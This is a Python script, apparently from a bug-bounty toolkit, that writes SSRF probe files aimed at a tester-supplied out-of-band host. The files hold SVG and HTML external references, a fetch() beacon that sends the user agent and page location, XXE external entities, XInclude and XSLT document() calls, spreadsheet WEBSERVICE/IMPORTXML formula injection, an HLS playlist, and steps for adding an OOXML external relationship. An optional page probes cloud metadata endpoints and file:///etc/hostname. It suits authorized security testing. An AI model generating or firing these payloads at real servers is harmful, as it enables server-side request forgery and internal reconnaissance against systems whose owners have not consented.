#!/usr/bin/env python3
"""Build SSRF test documents that make a server-side parser/renderer fetch YOUR host (offline).

Usage:
  ssrf_files.py --out DIR --collab YOU.oast.fun [--internal-proof]

Each external reference carries its own label (e.g. svg-image.YOU.oast.fun) so a hit identifies the vector.
Writes:
  svg_refs.svg              <image xlink:href>, <use>, <feImage>, @font-face src, @import, <script src>   (SR-06/28)
  html_render.html          img, link, @import, iframe, object, script, meta refresh, fetch(), srcset     (SR-04/19/47)
  html_render_internal.html benign internal proof for renderers: metadata instance-id + /etc/hostname (class R)
  xxe_oob.xml               external DTD / entity -> your host                                            (SR-29/50)
  xinclude.xml, xslt_document.xsl                                                                          (SR-50)
  webservice.csv            =WEBSERVICE() / =IMPORTXML-style formulas for spreadsheet converters           (SR-48)
  hls.m3u8                  playlist segment on your host for FFmpeg-based video processing                (SR-49)
  ooxml_note.txt            how to add an external relationship to a DOCX/XLSX by hand                     (SR-48)
Nothing here reads secrets: internal proofs use non-secret metadata keys and /etc/hostname only.
"""
import argparse
import os


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", required=True)
    ap.add_argument("--collab", required=True)
    ap.add_argument("--internal-proof", action="store_true", help="also write html_render_internal.html")
    a = ap.parse_args()
    C = a.collab
    L = lambda label: f"http://{label}.{C}/bbtest"
    files = {
        "svg_refs.svg": (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <style>@import url("{L("svg-import")}.css"); @font-face {{ font-family: bb; src: url("{L("svg-fontface")}.woff"); }}'
            ' text { font-family: bb; }</style>\n'
            f'  <image xlink:href="{L("svg-image")}.png" href="{L("svg-image2")}.png" width="10" height="10"/>\n'
            f'  <use xlink:href="{L("svg-use")}.svg#x"/>\n'
            f'  <filter id="f"><feImage xlink:href="{L("svg-feimage")}.png"/></filter><rect width="5" height="5" filter="url(#f)"/>\n'
            f'  <script xlink:href="{L("svg-script")}.js"/>\n'
            '  <text x="10" y="50">bbtest</text>\n</svg>\n'),
        "html_render.html": (
            "<!doctype html><html><head>\n"
            f'<link rel="stylesheet" href="{L("html-link")}.css">\n'
            f'<style>@import url("{L("html-import")}.css"); body {{ background: url("{L("html-cssbg")}.png"); }}</style>\n'
            f'<script src="{L("html-script")}.js"></script>\n'
            f'<meta http-equiv="refresh" content="5;url={L("html-meta")}">\n'
            "</head><body><p>bbtest render probe</p>\n"
            f'<img src="{L("html-img")}.png"><img srcset="{L("html-srcset")}.png 1x">\n'
            f'<iframe src="{L("html-iframe")}"></iframe><object data="{L("html-object")}"></object>\n'
            f'<video poster="{L("html-poster")}.png"></video><input type="image" src="{L("html-input")}.png">\n'
            f"<script>try{{fetch('{L('html-fetch')}?ua='+encodeURIComponent(navigator.userAgent)+'&loc='+encodeURIComponent(location.href))}}catch(e){{}}"
            f"document.write('<img src=\"{L('html-docwrite')}.png?js=1\">')</script>\n"
            "</body></html>\n"),
        "xxe_oob.xml": (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE r [ <!ENTITY % ext SYSTEM "{L("xxe-param")}.dtd"> %ext; <!ENTITY e SYSTEM "{L("xxe-entity")}"> ]>\n'
            "<r>&e;</r>\n"),
        "xinclude.xml": (
            '<r xmlns:xi="http://www.w3.org/2001/XInclude">'
            f'<xi:include parse="text" href="{L("xinclude")}"/></r>\n'),
        "xslt_document.xsl": (
            '<?xml version="1.0"?>\n<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n'
            f'  <xsl:template match="/"><xsl:copy-of select="document(\'{L("xslt-document")}\')"/></xsl:template>\n'
            "</xsl:stylesheet>\n"),
        "webservice.csv": (
            "name,value\n"
            f'bbtest,"=WEBSERVICE(""{L("csv-webservice")}"")"\n'
            f'bbtest2,"=IMAGE(""{L("csv-image")}.png"")"\n'
            f'bbtest3,"=IMPORTXML(""{L("csv-importxml")}"",""//a"")"\n'),
        "hls.m3u8": (
            "#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0,\n"
            f"{L('ffmpeg-hls')}.ts\n#EXT-X-ENDLIST\n"),
        "ooxml_note.txt": (
            "DOCX/XLSX/PPTX external relationship (manual):\n"
            "1. unzip a benign document; edit word/_rels/document.xml.rels (or xl/worksheets/_rels/...)\n"
            f'2. add <Relationship Id="rIdBB" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
            f'Target="{L("ooxml-rel")}.png" TargetMode="External"/>\n'
            "3. reference rIdBB from an <a:blip r:link=\"rIdBB\"/> (images) or add as attachedTemplate (settings.xml.rels)\n"
            "4. re-zip and upload to converters / previewers / thumbnailers. A hit = server-side fetch.\n"),
    }
    if a.internal_proof:
        files["html_render_internal.html"] = (
            "<!doctype html><p>bbtest internal proof (benign keys only)</p>\n"
            '<iframe src="http://169.254.169.254/latest/meta-data/instance-id" width="600" height="60"></iframe>\n'
            '<iframe src="http://metadata.google.internal/computeMetadata/v1/instance/id" width="600" height="60"></iframe>\n'
            '<iframe src="file:///etc/hostname" width="600" height="60"></iframe>\n'
            '<iframe src="http://127.0.0.1/" width="600" height="200"></iframe>\n'
            "<script>document.write('<p>renderer: '+navigator.userAgent+' at '+location.href+'</p>')</script>\n")
    os.makedirs(a.out, exist_ok=True)
    for n, c in files.items():
        with open(os.path.join(a.out, n), "w", encoding="utf-8", newline="\n") as fh:
            fh.write(c)
    print(f"[+] wrote {len(files)} files to {a.out}")
    for n in sorted(files):
        print("    " + n)


if __name__ == "__main__":
    main()
